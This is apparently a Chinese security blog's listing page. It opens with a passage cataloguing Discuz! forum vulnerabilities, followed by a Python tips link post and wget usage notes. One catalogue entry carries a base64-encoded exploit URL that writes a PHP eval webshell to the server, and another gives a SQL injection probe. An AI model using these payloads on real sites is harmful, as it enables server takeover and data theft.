+Discuz! moderation.inc.php 数据库&apos;注射&apos; bug  由于Discuz!的include/moderation.inc.php存在一个&apos;二次攻击&apos;导致数据库&apos;注射&apos;的bug     
+
+Discuz! trade.php 数据库&apos;注射&apos; bug   由于Discuz!的trade.php里的$message处理不严格导致引起数据库操作错误,通过SODB-2008-06而导致xss攻击及数据库信息泄露的漏洞.    
+
+Discuz! 数据库错误信息xss bug  由于Discuz!在处理数据库的错误信息时对$GLOBALS[&apos;PHP_SELF&apos;]没有过滤,导致在让数据库出错的情况下导致xss攻击.    
+
+Discuz!4.x wap\index.php 变量覆盖漏洞     由于Discuz!的wap\index.php处理post的变量不严谨而导致变量覆盖,从而可能导致sql注射/代码执行/xss等攻击.     
+
+Discuz! cache.func.php信息泄漏的bug  由于Discuz!的\include\cache.func.php缺少访问限制导致版本及补丁消息的泄露.    
+
+Discuz! flash Crsf bug  由于Discuz!对flash跨域策略文件及上传图片文件处理不严导致可以绕过formhash及Referer的限制,导致csrf攻击.     
+
+Discuz! admincp.php xss bug     由于Discuz!的后台登陆文件$url_forward没有过滤导致一个严重的xss bug.     
+
+Discuz![flash] xss bug  由于Discuz!对上传图片文件处理不严及flash标签安全设置不严导致一个严重的xss bug.   
+
+Discuz 6.x—7.x:WAP高危漏洞,wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题
+
+Discuz 7.0-7.2:后台settings.inc.php中写shell漏洞
+
+Discuz 7.1-7.2：showmessage bug,利用方式:misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}
+
+Discuz 7.2:SQL注入漏洞/manyou/sources/notice.php
+
+Discuz 7.2代码执行漏洞
+
+Discuz! x1-1.5 SQL 注入 GetShell EXP 
+
+Discuz! X1-1.5 notify_credit.php 页面SQL注入漏洞 
+
+Discuz! 1.5 跨站脚本攻击漏洞 UC登陆页面存在跨站漏洞
+
+DiscuzX1.5 门户管理权限SQL注入BUG
+
+DZ-X1.5 论坛后台拿WebShell
+
+discuz x1.5&amp;discuz 7.2 后台getshell 0day
+
+DISCUZ X1.5 本地文件包含漏洞
+
+Discuz! X2:SQL注入漏洞source\module\forum\forum_attachment.php
+
+Discuz! X2:SQL注入member.php?mod=logging&amp;action=login，提交username=1+and+1=1
+
+Discuz!NT 2.x - 3.5.2 SQL注入(0day)
+
+Discuz!NT3.5.2文件编辑0Day获取Webshell
+</code></pre>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-python-tips/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-python-tips/" class="post-title-link" itemprop="url">Python skill collection</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 00:45:07" itemprop="dateCreated datePublished" datetime="2016-05-14T00:45:07+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:29:32" itemprop="dateModified" datetime="2019-03-12T16:29:32+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-python-tips/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-python-tips/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-pythondebugger/" target="_blank" rel="noopener">Python代码调试技巧</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/04/2016-05-14-wget-usage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/04/2016-05-14-wget-usage/" class="post-title-link" itemprop="url">wget 使用筆記</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-04 14:52:16" itemprop="dateCreated datePublished" datetime="2016-05-04T14:52:16+08:00">2016-05-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:28:29" itemprop="dateModified" datetime="2019-03-12T16:28:29+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/04/2016-05-14-wget-usage/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/04/2016-05-14-wget-usage/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h1><p>需要下载某个目录下面的所有文件。命令如下</p>
+<pre><code>wget -c -r -np -k -L -p www.xxx.org/pub/path/
+</code></pre><p>在下载时。有用到外部域名的图片或连接。如果需要同时下载就要用-H参数。</p>
+<pre><code>wget -np -nH -r --span-hosts www.xxx.org/pub/path/
+
+-c 断点续传
+-r 递归下载，下载指定网页某一目录下（包括子目录）的所有文件
+-nd 递归下载时不创建一层一层的目录，把所有的文件下载到当前目录
+-np 递归下载时不搜索上层目录，如wget -c -r www.xxx.org/pub/path/
+没有加参数-np，就会同时下载path的上一级目录pub下的其它文件
+-k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数
+-L 递归时不进入其它主机，如wget -c -r www.xxx.org/ 
+</code></pre><p>如果网站内有一个这样的链接：<br><a href="http://www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站" target="_blank" rel="noopener">www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</a></p>
+<pre><code>-p 下载网页所需的所有文件，如图片等
+-A 指定要下载的文件样式列表，多个样式用逗号分隔
+-i 后面跟一个文件，文件内指明要下载的URL
+</code></pre><p>还有其他的用法，我从网上搜索的，也一并写上来，方便以后自己使用。</p>
+<h1 id="wget的常见用法"><a href="#wget的常见用法" class="headerlink" title="wget的常见用法"></a>wget的常见用法</h1><p><strong>wget的使用格式</strong></p>
+<pre><code>Usage: wget [OPTION]… [URL]…
+</code></pre><ul>
+<li><p>用wget做站点镜像:</p>
+<pre><code>wget -r -p -np -k http://dsec.pku.edu.cn/~usr_name/
+</code></pre><p>  或者</p>
+<pre><code>wget -m http://www.tldp.org/LDP/abs/html/
+</code></pre></li>
+<li><p>在不稳定的网络上下载一个部分下载的文件，以及在空闲时段下载</p>
+<pre><code>wget -t 0 -w 31 -c http://dsec.pku.edu.cn/BBC.avi -o down.log &amp;
+</code></pre><p>  或者从filelist读入要下载的文件列表</p>
+<pre><code>wget -t 0 -w 31 -c -B ftp://dsec.pku.edu.cn/linuxsoft -i filelist.txt -o down.log &amp;
+</code></pre></li>
+</ul>
+<p>上面的代码还可以用来在网络比较空闲的时段进行下载。我的用法是:在mozilla中将不方便当时下载的URL链接拷贝到内存中然后粘贴到文件filelist.txt中，在晚上要出去系统前执行上面代码的第二条。</p>
+<ul>
+<li><p>使用代理下载</p>
+<pre><code>wget -Y on -p -k https://sourceforge.net/projects/wvware/
+</code></pre><p>  代理可以在环境变量或wgetrc文件中设定</p>
+<p>  在环境变量中设定代理</p>
+<pre><code>export PROXY=http://211.90.168.94:8080/
+</code></pre><p>  在~/.wgetrc中设定代理</p>
+<pre><code>http_proxy = http://proxy.yoyodyne.com:18023/
+ftp_proxy = http://proxy.yoyodyne.com:18023/
+</code></pre></li>
+</ul>
+<h1 id="wget各种选项分类列表"><a href="#wget各种选项分类列表" class="headerlink" title="wget各种选项分类列表"></a>wget各种选项分类列表</h1><ul>
+<li><p>启动</p>
+<pre><code>-V, –version 显示wget的版本后退出
+-h, –help 打印语法帮助
+-b, –background 启动后转入后台执行
+-e, –execute=COMMAND 
+</code></pre><p>  执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc</p>
+</li>
+<li><p>记录和输入文件</p>
+<pre><code>-o, –output-file=FILE 把记录写到FILE文件中
+-a, –append-output=FILE 把记录追加到FILE文件中
+-d, –debug 打印调试输出
+-q, –quiet 安静模式(没有输出)
+-v, –verbose 冗长模式(这是缺省设置)
+-nv, –non-verbose 关掉冗长模式，但不是安静模式
+-i, –input-file=FILE 下载在FILE文件中出现的URLs
+-F, –force-html 把输入文件当作HTML格式文件对待
+-B, –base=URL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀
+–sslcertfile=FILE 可选客户端证书
+–sslcertkey=KEYFILE 可选客户端证书的KEYFILE
+–egd-file=FILE 指定EGD socket的文件名
+</code></pre></li>
+<li><p>下载</p>
+<pre><code>–bind-address=ADDRESS 
+</code></pre><p>  指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用)</p>
+<pre><code>-t, –tries=NUMBER 设定最大尝试链接次数(0 表示无限制).
+-O –output-document=FILE 把文档写到FILE文件中
+-nc, –no-clobber 不要覆盖存在的文件或使用.#前缀
+-c, –continue 接着下载没下载完的文件
+–progress=TYPE 设定进程条标记
+-N, –timestamping 不要重新下载文件除非比本地文件新
+-S, –server-response 打印服务器的回应
+–spider 不下载任何东西
+-T, –timeout=SECONDS 设定响应超时的秒数
+-w, –wait=SECONDS 两次尝试之间间隔SECONDS秒
+–waitretry=SECONDS 在重新链接之间等待1…SECONDS秒
+–random-wait 在下载之间等待0…2*WAIT秒
+-Y, –proxy=on/off 打开或关闭代理
+-Q, –quota=NUMBER 设置下载的容量限制
+–limit-rate=RATE 限定下载输率
+</code></pre></li>
+<li><p>目录</p>
+<pre><code>-nd –no-directories 不创建目录
+-x, –force-directories 强制创建目录
+-nH, –no-host-directories 不创建主机目录
+-P, –directory-prefix=PREFIX 将文件保存到目录 PREFIX/…
+–cut-dirs=NUMBER 忽略 NUMBER层远程目录
+</code></pre></li>
+<li><p>HTTP 选项</p>
+<pre><code>–http-user=USER 设定HTTP用户名为 USER.
+–http-passwd=PASS 设定http密码为 PASS.
+-C, –cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许).
+-E, –html-extension 将所有text/html文档以.html扩展名保存
+–ignore-length 忽略 `Content-Length&apos;头域
+–header=STRING 在headers中插入字符串 STRING
+–proxy-user=USER 设定代理的用户名为 USER
+–proxy-passwd=PASS 设定代理的密码为 PASS
+–referer=URL 在HTTP请求中包含 `Referer: URL&apos;头
+-s, –save-headers 保存HTTP头到文件
+-U, –user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION.
+–no-http-keep-alive 关闭 HTTP活动链接 (永远链接).
+–cookies=off 不使用 cookies.
+–load-cookies=FILE 在开始会话前从文件 FILE中加载cookie
+–save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中
+</code></pre></li>
+<li><p>FTP 选项</p>
+<pre><code>-nr, –dont-remove-listing 不移走 `.listing&apos;文件
+-g, –glob=on/off 打开或关闭文件名的 globbing机制
+–passive-ftp 使用被动传输模式 (缺省值).
+–active-ftp 使用主动传输模式
+–retr-symlinks 在递归的时候，将链接指向文件(而不是目录)
+</code></pre></li>
+<li><p>递归下载</p>
+<pre><code>-r, –recursive 递归下载－－慎用!
+-l, –level=NUMBER 最大递归深度 (inf 或 0 代表无穷).
+–delete-after 在现在完毕后局部删除文件
+-k, –convert-links 转换非相对链接为相对链接
+-K, –backup-converted 在转换文件X之前，将之备份为 X.orig
+-m, –mirror 等价于 -r -N -l inf -nr.
+-p, –page-requisites 下载显示HTML文件的所有图片
+</code></pre></li>
+<li><p>递归下载中的包含和不包含(accept/reject)</p>
+<pre><code>-A, –accept=LIST 分号分隔的被接受扩展名的列表
+-R, –reject=LIST 分号分隔的不被接受的扩展名的列表
+-D, –domains=LIST 分号分隔的被接受域的列表
+–exclude-domains=LIST 分号分隔的不被接受的域的列表
+–follow-ftp 跟踪HTML文档中的FTP链接
+–follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表
+-G, –ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表
+-H, –span-hosts 当递归时转到外部主机
+-L, –relative 仅仅跟踪相对链接
+-I, –include-directories=LIST 允许目录的列表
+-X, –exclude-directories=LIST 不被包含目录的列表
+-np, –no-parent 不要追溯到父目录
+</code></pre></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+
+
+          </div>
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Jayce Links</p>
+              <div class="site-description motion-element" itemprop="description">运维 | 安全 | 渗透</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">  <a href="http://www.miitbeian.gov.cn" rel="noopener" target="_blank">2.8378204901507734e+40 </a>&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jayce Links</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a></div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
+
+
+
+  
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+  <script id="dsq-count-scr" src="https://securitainment.disqus.com/count.js" async></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
